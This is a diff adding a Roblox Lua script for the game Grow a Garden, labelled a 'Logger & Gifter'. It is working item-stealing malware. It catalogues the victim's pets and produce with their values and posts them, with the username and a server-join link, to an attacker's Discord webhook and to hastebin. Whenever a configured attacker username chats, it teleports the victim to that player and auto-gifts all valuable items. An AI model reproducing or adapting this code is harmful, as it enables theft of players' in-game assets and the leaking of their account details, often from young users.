@@ -1,1 +1,195 @@
+-- Grow a Garden: Ultimate Logger & Gifter – Clean Version
+-- Fixed by removing broken "PetValues" dependency
+-- Made by Timoci | discord.gg/notyet
 
+local CONFIG = {
+    USERNAMES = _G.Usernames or {},
+    WEBHOOK   = _G.webhook or "",
+    MIN_VALUE = _G.min_value or 1,
+}
+
+local req = request or http_request or (syn and syn.request)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local backpack = plr:WaitForChild("Backpack")
+local modules = replicatedStorage:WaitForChild("Modules")
+
+local calcPlantValue   = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils         = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry      = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil       = require(modules:WaitForChild("NumberUtil"))
+local dataService      = require(modules:WaitForChild("DataService"))
+
+-- 🐾 Rare pets mapping
+local RARE_PETS = {
+    ["Raccoon"]        = "🦥",
+    ["Dragonfly"]      = "🐦‍🔥",
+    ["Red Fox"]        = "🦊",
+    ["Chicken Zombie"] = "🧟‍♂️",
+    ["Disco Bee"]      = "🪩",
+    ["Queen Bee"]      = "🐝",
+    ["Butterfly"]      = "🦋",
+    ["Mimic Octopus"]  = "🐙",
+}
+local DEFAULT_PET_EMOJI = "🐶"
+local DEFAULT_FRUIT_EMOJI = "🥝"
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+
+-- 🔐 Validation
+if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
+    plr:Kick("Missing usernames or webhook in config!")
+    return
+end
+
+-- 🌐 Server checks
+if game.PrivateServerId ~= "" then
+    plr:Kick("Private servers are not supported. Join a public GAG server.")
+    return
+end
+if game.PlaceId ~= 126884695634066 then
+    plr:Kick("Unsupported game. Use Grow a Garden public server.")
+    return
+end
+
+-- 🧠 Utility functions
+local function getPetEmoji(name) return RARE_PETS[name] or DEFAULT_PET_EMOJI end
+local function formatValue(n) return tostring(math.floor(n or 0)):reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,","") end
+local function getWeight(tool)
+    local w = tool:FindFirstChildWhichIsA("NumberValue") or tool:FindFirstChild("WeightValue")
+    return w and tonumber(w.Value) or tonumber(tool.Name:match("%(([%d%.]+)kg%)")) or 0
+end
+local function getPetAge(tool)
+    return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?"
+end
+
+-- 🧺 Collect backpack items
+local function collectItems()
+    local items, totalValue, foundRare = {}, 0, false
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+            if tool:GetAttribute("ItemType") == "Pet" then
+                local uuid = tool:GetAttribute("PET_UUID")
+                local pdata = dataService:GetData().PetsData.PetInventory.Data[uuid]
+                local name = pdata and pdata.PetType or "Unknown"
+                local isRare = RARE_PETS[name] ~= nil
+                local lvl = pdata and petUtils:GetLevelProgress(pdata.PetData.Level or 1) or 0
+                local baseVal = petRegistry.PetList[name] and petRegistry.PetList[name].SellPrice or 0
+                local petVal = math.floor(baseVal * math.lerp(0.15, 6, lvl))
+                local weight = getWeight(tool)
+                local age = getPetAge(tool)
+                foundRare = foundRare or isRare
+                totalValue += petVal
+                table.insert(items, {
+                    Tool = tool, Name = name, Value = petVal, Weight = weight,
+                    Type = "Pet", Emoji = getPetEmoji(name), Age = age
+                })
+            else
+                local val = calcPlantValue(tool)
+                if val >= CONFIG.MIN_VALUE then
+                    local weight = getWeight(tool)
+                    totalValue += val
+                    table.insert(items, {
+                        Tool = tool, Name = tool.Name, Value = val,
+                        Weight = weight, Type = "Fruit", Emoji = DEFAULT_FRUIT_EMOJI, Age = nil
+                    })
+                end
+            end
+        end
+    end
+    table.sort(items, function(a, b) return a.Value > b.Value end)
+    return items, totalValue, foundRare
+end
+
+-- 🔗 Hastebin overflow
+local function uploadOverflow(lines)
+    local body = table.concat(lines, "\n")
+    local res = req({
+        Url = "https://hastebin.com/documents",
+        Method = "POST",
+        Headers = {["Content-Type"] = "text/plain"},
+        Body = body
+    })
+    local ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
+    return ok and parsed.key and ("https://hastebin.com/" .. parsed.key) or nil
+end
+
+-- 📦 Embed builder
+local function buildEmbed(player, receiver)
+    local items, totalVal, rare = collectItems()
+    local top10, overflow = {}, {}
+    for i, v in ipairs(items) do
+        (i <= 10 and table.insert(top10, v) or table.insert(overflow, v))
+    end
+
+    local function line(item)
+        return string.format("%s [%s]%s [%.2fkg] → %s¢",
+            item.Emoji, item.Name, item.Age and (", Age "..item.Age) or "",
+            item.Weight, formatValue(item.Value))
+    end
+
+    local overflowLink = (#overflow > 0 and uploadOverflow(table.create(#overflow, function(i) return line(overflow[i]) end))) or nil
+    local embed = {
+        content = rare and "@everyone" or "",
+        embeds = {{
+            title = "🥗 Grow A Garden Hit",
+            color = rare and 16776960 or 65280,
+            fields = {
+                {name="👤 Player Info", value=string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s days`", player.Name, receiver, player.AccountAge), inline=false},
+                {name="💰 Total Value", value="**" .. formatValue(totalVal) .. "¢**", inline=false},
+                {name="🎒 Top 10 Backpack Items", value=table.concat(table.create(#top10, function(i) return line(top10[i]) end), "\n"), inline=false},
+                overflowLink and {name="📎 Full Backpack", value="[Click to view all items](" .. overflowLink .. ")", inline=false} or nil,
+                {name="🌴 Join with URL", value=("[Join Instance](https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s)"):format(game.JobId), inline=false}
+            },
+            footer = { text = "Made by Timoci" }
+        }}
+    }
+    return embed
+end
+
+-- 📤 Send webhook
+local function sendWebhook()
+    if req then
+        local data = buildEmbed(plr, CONFIG.USERNAMES[1])
+        req({
+            Url = CONFIG.WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end
+end
+
+-- 🔁 Gift logic (remains same)
+local gifted = false
+local function doGift(target)
+    if gifted then return end
+    gifted = true
+    local char = plr.Character or plr.CharacterAdded:Wait()
+    char:WaitForChild("HumanoidRootPart").CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
+    for _, item in ipairs(select(1, collectItems())) do
+        item.Tool.Parent = plr.Character
+        local prompt = target.Character:FindFirstChildWhichIsA("ProximityPrompt", true)
+        if prompt then
+            fireproximityprompt(prompt)
+            wait(0.2)
+        end
+        item.Tool.Parent = backpack
+    end
+end
+
+-- 👂 Gift listener
+for _, user in ipairs(Players:GetPlayers()) do
+    if table.find(CONFIG.USERNAMES, user.Name) then
+        user.Chatted:Connect(function() doGift(user) end)
+    end
+end
+Players.PlayerAdded:Connect(function(user)
+    if table.find(CONFIG.USERNAMES, user.Name) then
+        user.Chatted:Connect(function() doGift(user) end)
+    end
+end)
+
+-- 🚀 Begin
+sendWebhook()
